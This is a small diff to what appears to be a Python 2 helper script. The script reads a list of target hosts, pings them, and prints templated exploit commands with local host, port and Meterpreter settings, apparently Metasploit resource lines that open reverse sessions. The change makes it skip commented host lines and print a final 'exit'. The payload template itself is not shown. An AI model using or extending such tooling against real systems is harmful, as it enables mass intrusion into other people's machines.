@@ -34,7 +34,8 @@ if opt == "-f":
     remote_hosts = []
     fp = open(sys.argv[2],'r')
     for line in fp:
-        remote_hosts.append(line.strip())
+        if line.find("#") == -1:
+            remote_hosts.append(line.strip())
 
 for remote_host in remote_hosts:
     if no_ping:
@@ -42,5 +43,5 @@ for remote_host in remote_hosts:
     else:
         if pyping.ping(str(remote_host)):
             print payload % (exploit,remote_host,local_host,local_port,meterpreter)
-
+print "exit"
             
